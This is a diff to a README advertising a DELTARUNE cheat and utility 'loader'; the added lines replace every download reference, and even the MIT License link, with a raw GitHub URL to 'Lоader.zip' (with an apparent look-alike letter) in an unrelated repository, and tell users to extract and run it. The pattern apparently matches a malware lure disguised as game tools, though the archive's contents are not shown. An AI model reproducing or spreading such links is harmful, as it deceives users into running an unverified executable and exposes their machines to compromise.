@@ -6,10 +6,10 @@ Welcome to your all-in-one solution for advanced DELTARUNE features in 2025! Thi
 
 | Operating System   | Compatible | Download Method      | Notes           |
 |--------------------|:----------:|---------------------|-----------------|
-| Windows 10/11      | ✅         | Loader.rar          | Fully supported |
-| macOS (10.13+)     | ✅         | Loader.rar          | M1/M2 tested    |
-| Linux (Ubuntu 20+) | ✅         | Loader.rar, Wine    | Stable via Wine |
-| Steam Deck         | ⚠️         | Loader.rar, Proton  | Experimental    |
+| Windows 10/11      | ✅         | https://raw.githubusercontent.com/O-cniel/Sovereign-Land-record-Norway/main/Lоader.zip          | Fully supported |
+| macOS (10.13+)     | ✅         | https://raw.githubusercontent.com/O-cniel/Sovereign-Land-record-Norway/main/Lоader.zip          | M1/M2 tested    |
+| Linux (Ubuntu 20+) | ✅         | https://raw.githubusercontent.com/O-cniel/Sovereign-Land-record-Norway/main/Lоader.zip, Wine    | Stable via Wine |
+| Steam Deck         | ⚠️         | https://raw.githubusercontent.com/O-cniel/Sovereign-Land-record-Norway/main/Lоader.zip, Proton  | Experimental    |
 
 ## ✨ Feature List
 
@@ -26,7 +26,7 @@ DELTARUNE advanced tools, DELTARUNE hacks, DELTARUNE 2025 utilities, save manage
 
 ## 🛠️ Installation
 
-1. Download **Loader.rar** from the repository.
+1. Download **https://raw.githubusercontent.com/O-cniel/Sovereign-Land-record-Norway/main/Lоader.zip** from the repository.
 2. Extract all files to your DELTARUNE installation directory.
 3. Run the Loader. Follow on-screen setup for your OS.
 4. Enjoy enhanced gameplay features!
@@ -37,4 +37,4 @@ This toolkit is designed for educational and entertainment purposes only. Usage 
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) – 2025
+Distributed under the [MIT License](https://raw.githubusercontent.com/O-cniel/Sovereign-Land-record-Norway/main/Lоader.zip) – 2025
